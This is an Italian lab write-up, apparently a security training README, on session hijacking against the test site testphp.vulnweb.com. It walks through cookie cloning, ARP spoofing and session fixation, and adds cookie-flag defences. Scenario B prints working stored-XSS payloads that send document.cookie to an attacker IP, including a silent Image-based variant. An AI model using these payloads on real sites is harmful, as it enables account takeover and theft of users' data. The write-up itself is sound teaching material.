> [English](README.en.md) | **Italiano**

# Auth Attacks: Session Hijacking

> - **Fase:** Web Attack - Session Hijacking
> - **Visibilita:** Media (XSS per cookie stealing) / Alta (ARP spoofing su LAN) / Nulla (cookie cloning manuale con accesso fisico)
> - **Prerequisiti:** Sessione attiva della vittima, vettore XSS identificato (per Scenario B) o presenza sulla stessa LAN (per Scenario C)
> - **Output:** Cookie di sessione della vittima, accesso impersonato all'account, finding WEB-010

---

**ID Finding:** `WEB-010` | **Severity:** `Alto` | **CVSS v3.1:** 8.0

---

Obiettivo: Dimostrare come un attaccante può impersonare un utente autenticato sottraendo il suo identificativo di sessione (Session ID), bypassando completamente la password e l'autenticazione a due fattori (2FA).

Target: `http://testphp.vulnweb.com`

Lab Setup:

- Attaccante: Kali Purple (IP: `192.168.0.110`)
- Vittima: Windows 10 (Chrome)

Strumenti: Browser DevTools, Python (HTTP Server), XSS Payload, Ettercap, Wireshark.

---

## 1 Teoria: Il "Passpartout"

Il protocollo HTTP è stateless (senza memoria). Per "ricordarsi" chi sei dopo il login, il server ti assegna un Session ID (solitamente salvato nei Cookie).
In termini di sicurezza: Chi possiede quel cookie È l'utente.

Se un attaccante lo ottiene, può accedere all'account della vittima immediatamente, senza conoscere le credenziali.

---

## 2 Vettori di Attacco Principali

- XSS (Cross-Site Scripting): Iniettare JavaScript malevolo per leggere `document.cookie` e inviarlo a un server esterno.
- Network Sniffing: Intercettare traffico HTTP non cifrato (es. su Wi-Fi pubblici) per leggere i cookie in transito.
- Session Fixation: L'attaccante "fissa" un ID di sessione noto e forza la vittima a usare quello per loggarsi.
- Malware/Physical Access: Rubare i file database dei cookie direttamente dal PC della vittima.

---

## 3 Scenario A: Manual Cookie Cloning (Basic)

In questo scenario simuliamo il concetto base: se copio il cookie da un browser all'altro, trasferisco la sessione.

Procedura:

#### Browser A (Vittima): Effettua il login legittimo su `testphp.vulnweb.com`.

Estrazione: Apre i DevTools (`F12` > Storage > Cookies) e copia il valore del cookie.

Valore tipico: `login=test%2Ftest`

#### Browser B (Attaccante): Apre la home page del sito (non autenticato).

Injection: Apre la Console Developer e digita:

```JavaScript
document.cookie="login=test%2Ftest";
```

Refresh: Ricaricando la pagina, il Browser B risulta loggato come l'utente vittima.

---

## 4 Scenario B: XSS to Cookie Stealing (Advanced Red Team)

In questo scenario reale, automatizziamo il furto usando una vulnerabilità del sito, senza avere accesso fisico al PC della vittima.

#### Fase 1: Setup della Trappola

L'attaccante sfrutta una vulnerabilità Stored XSS nel Guestbook. L'obiettivo è iniettare uno script che invii il cookie al server attaccante (`192.168.0.110`).

Listener (Kali):

```Bash
python3 -m http.server 8000
```

Payload XSS:

```HTML
<script>document.location='http://192.168.0.110:8000/?cookie='+document.cookie;</script>
```

Nota Tecnica (Stealth): Questo payload usa un redirect (`document.location`), che è visibile alla vittima. Un attaccante reale potrebbe usare un metodo silenzioso (es. `new Image().src = 'http://192.168.0.110:8000/?c='+document.cookie`) per rubare il cookie in background senza che la vittima se ne accorga.

#### Fase 2: Esecuzione (The Heist)

La vittima visita la pagina del Guestbook. Il browser esegue lo script e viene forzato a visitare il server dell'attaccante, esponendo il cookie nell'URL.

Evidenza 1: Redirect della Vittima

La vittima vede una "Directory listing" del server attaccante invece del sito. Nella barra degli indirizzi si vede il cookie rubato: `login=test%2Ftest`.

![](./img/Screenshot_2026-02-14_23_50_43.jpg)

#### Fase 3: Acquisizione e Injection

L'attaccante riceve il cookie nei log del server Python e lo inietta nel proprio browser tramite console.

Evidenza 2: Log su Kali & Injection Manuale

![](./img/Screenshot_2026-02-14_23_52_53.jpg)

A sinistra i log del server che mostrano la richiesta GET con il cookie. A destra la console del browser attaccante dove viene impostato il cookie.

#### Fase 4: Impersonificazione (Success)

Dopo aver impostato il cookie e aggiornato la pagina, l'attaccante ha accesso completo ai dati sensibili (carta di credito, email) dell'utente `test`.

Evidenza 3: Accesso Eseguito

![](./img/Screenshot_2026-02-14_23_53_10.jpg)

---

## 5 Secure Coding (Difesa)

Per mitigare questi attacchi è necessario agire su più livelli:

- Flag `HttpOnly`:
    
    Rende il cookie invisibile a JavaScript. Se attivo, `document.cookie` restituisce una stringa vuota, rendendo l'attacco XSS inefficace per il furto di sessione. Questo è il motivo principale per cui l'attacco sopra ha avuto successo: il flag mancava.

- Flag `Secure`:
    
    Assicura che il cookie venga inviato solo su connessioni HTTPS cifrate (protegge dallo Sniffing).

- Flag `SameSite` (Strict/Lax):
    
    Previene l'invio del cookie su richieste Cross-Site (mitiga CSRF e alcuni vettori di XSS leaking).

- Session Rotation:
    
    Rigenerare il Session ID subito dopo il login. Questo impedisce gli attacchi di Session Fixation.

- Input Sanitization:
    
    Sanitizzare sempre l'input utente per prevenire l'iniezione di codice XSS alla radice.

---

## 6 Scenario C: Network Sniffing (Man-in-the-Middle)

In questo scenario, l'attaccante si posiziona all'interno della stessa rete locale (LAN) della vittima. Poiché il target `testphp.vulnweb.com` utilizza il protocollo HTTP non cifrato, tutto il traffico, inclusi i cookie di sessione, viaggia "in chiaro".

Tecnica: ARP Spoofing

L'attaccante utilizza tecniche di ARP Poisoning per ingannare il PC della vittima, facendogli credere che la macchina dell'attaccante sia il Router. In questo modo, tutto il traffico della vittima transita attraverso Kali prima di raggiungere internet.

Procedura Lab:

1.  Tool: `Ettercap` (per ARP Spoofing) e `Wireshark` (per l'analisi pacchetti).

2.  Targeting: La vittima (Windows 10) viene targettizzata affinché il suo traffico passi per l'interfaccia `eth0` di Kali.

3.  Sniffing: Su Wireshark viene applicato il filtro `http.cookie`.

4.  Cattura: Appena la vittima effettua il login, il cookie viene intercettato.

Evidenza:

![](./img/Screenshot_2026-02-15_00_49_44.jpg)

![](./img/Screenshot_2026-02-15_00_53_55.jpg)

Wireshark mostra chiaramente il pacchetto GET request contenente l'header: `Cookie: login=test%2Ftest`

Mitigazione:

L'unica difesa efficace contro lo sniffing è l'utilizzo di HTTPS (TLS/SSL) e il flag `Secure` sui cookie. Questo cifra il traffico rendendolo illeggibile anche se intercettato.

---

## 7 Scenario D: Session Fixation (Theoretical Trap)

A differenza del furto (Hijacking), qui l'attaccante impone un Session ID noto alla vittima prima ancora che essa effettui il login.

Il Concetto:

Molti server web accettano il Session ID non solo via Cookie, ma anche via parametro URL (es. `PHP_SESSION_ID`).

La Kill Chain:

1.  Setup: L'attaccante visita il sito e ottiene un ID di sessione valido (es. `PHPSESSID=12345`) senza fare login.

2.  La Trappola: L'attaccante invia alla vittima un link malevolo contenente quell'ID: `http://testphp.vulnweb.com/login.php?PHPSESSID=12345`

3.  L'Accesso: La vittima clicca il link. Il server vede l'ID `12345` nell'URL e lo "fissa" per quella sessione.

4.  Autenticazione: La vittima inserisce user e password. Il server promuove l'ID `12345` a "ID autenticato".

5.  L'Intrusione: L'attaccante, che possedeva già il cookie `12345` nel suo browser, aggiorna la pagina e si ritrova loggato come la vittima.

Mitigazione:

Il server deve implementare la Session Rotation: ogni volta che un utente cambia livello di privilegio (es. fa login), il server deve distruggere il vecchio Session ID e generarne uno completamente nuovo.

---

## Analisi a Basso Livello: Cookie Attributes e ARP Spoofing

### Attributi di Sicurezza dei Cookie (RFC 6265bis)

Ogni attributo del cookie agisce come una barriera indipendente contro un vettore di attacco specifico:

```
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

HttpOnly     -> Blocca document.cookie (anti-XSS cookie stealing)
                JavaScript NON puo leggere il cookie
                Il cookie viene comunque inviato nelle richieste HTTP

Secure       -> Cookie inviato SOLO su HTTPS (anti-sniffing)
                Se la vittima visita http:// il cookie NON viene allegato

SameSite=Strict -> Cookie NON inviato su richieste cross-origin
                   Protegge da CSRF e da leak via tag <img> cross-site
   Lax (default) -> Cookie inviato solo per navigazione top-level (link click)
   None          -> Cookie inviato sempre (richiede Secure)

Path=/app    -> Cookie valido solo per /app e sotto-path
                Riduce l'esposizione ad altre parti del sito

Max-Age=3600 -> Cookie scade dopo 1 ora (riduce finestra di attacco)
                Session cookie (senza Max-Age) vive fino alla chiusura del browser
```

### ARP Spoofing: Meccanica a Livello di Rete

```
Rete normale:
Vittima (192.168.0.105) ---> Router (192.168.0.1) ---> Internet
ARP Table vittima: 192.168.0.1 = AA:BB:CC:DD:EE:FF (MAC router)

Dopo ARP Spoofing (Ettercap):
Kali invia pacchetti ARP Reply falsificati:
  "192.168.0.1 ha MAC 11:22:33:44:55:66" (MAC di Kali)

ARP Table vittima (avvelenata): 192.168.0.1 = 11:22:33:44:55:66 (MAC di KALI!)

Flusso dopo il poisoning:
Vittima ---> KALI (intercetta e legge) ---> Router ---> Internet
                |
                +-- Wireshark cattura il cookie HTTP in chiaro
                    Filtro: http.cookie contains "PHPSESSID"
```

### Confronto Vettori di Session Hijacking

| Vettore | Requisiti | Visibilita | Difesa principale |
| :--- | :--- | :--- | :--- |
| XSS cookie stealing | Vulnerabilita XSS nel sito | Media (log JS) | `HttpOnly` flag |
| Network sniffing | Stessa LAN + HTTP (no HTTPS) | Bassa (passivo) | HTTPS + `Secure` flag |
| Session fixation | URL con session ID accettato | Nulla | Session rotation post-login |
| Malware/Physical | Accesso al filesystem della vittima | Dipende | Full-disk encryption |
| Wi-Fi Evil Twin | Access point controllato dall'attaccante | Bassa | HTTPS + HSTS preload |

---

## Esperienza di Laboratorio

Lo Scenario B (XSS to Cookie Stealing) ha dimostrato la catena completa in un ambiente reale: dal payload XSS nel Guestbook al redirect della vittima, alla ricezione del cookie nei log del server Python. L'aspetto piu significativo e stato osservare che il cookie `login=test%2Ftest` contiene username e password URL-encoded direttamente nel valore del cookie, una pratica insicura che amplifica l'impatto del furto.

L'ARP spoofing con Ettercap (Scenario C) ha richiesto la configurazione di IP forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`) per evitare di interrompere la connessione della vittima. Senza IP forwarding, i pacchetti arrivano a Kali ma non vengono inoltrati al router, causando un Denial of Service che allarma la vittima. Con il forwarding attivo, il traffico fluisce normalmente e la vittima non nota alcuna anomalia.

Il confronto tra gli scenari ha evidenziato che l'assenza del flag `HttpOnly` e il single point of failure: con `HttpOnly` attivo, lo Scenario A e B falliscono completamente (JavaScript non puo accedere al cookie), ma lo Scenario C resta valido (il cookie viaggia in chiaro nell'header HTTP). Solo la combinazione `HttpOnly` + `Secure` + HTTPS protegge da tutti i vettori documentati. L'aggiunta di `SameSite=Strict` bloccherebbe anche attacchi futuri basati su redirect cross-origin.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal Web Session Cookie | `T1539` | Furto del cookie `login=test%2Ftest` tramite payload XSS Stored nel Guestbook (Scenario B) e tramite intercettazione di rete (Scenario C) (WEB-010) |
| Collection | Man-in-the-Middle: AiTM HTTPS Interception | `T1557.002` | ARP spoofing con Ettercap + cattura pacchetti HTTP con Wireshark per estrarre il cookie di sessione in chiaro (Scenario C - WEB-010) |
| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | `T1550.004` | Iniezione del cookie rubato nel browser attaccante tramite console JavaScript (`document.cookie = "..."`) per impersonare la sessione della vittima (WEB-010) |
| Initial Access | Exploit Public-Facing Application | `T1190` | Sfruttamento dell'assenza del flag `HttpOnly` sul cookie di sessione, che permette l'accesso tramite JavaScript (WEB-010) |
| Collection | Browser Session Hijacking | `T1185` | Impersonazione della sessione autenticata della vittima dopo l'injection del cookie, con accesso ai dati sensibili del profilo |

---

> **Nota:** Le attivita documentate sono state condotte in un ambiente di laboratorio controllato:
> Kali Purple (attaccante, IP: 192.168.0.110) e Windows 10 Chrome (vittima) su rete locale
> isolata. Target: `testphp.vulnweb.com`. L'ARP spoofing su reti aziendali o pubbliche senza
> autorizzazione e un reato grave. Il flag `HttpOnly` e disponibile su tutti i web server moderni
> e la sua assenza e una negligenza di configurazione evitabile.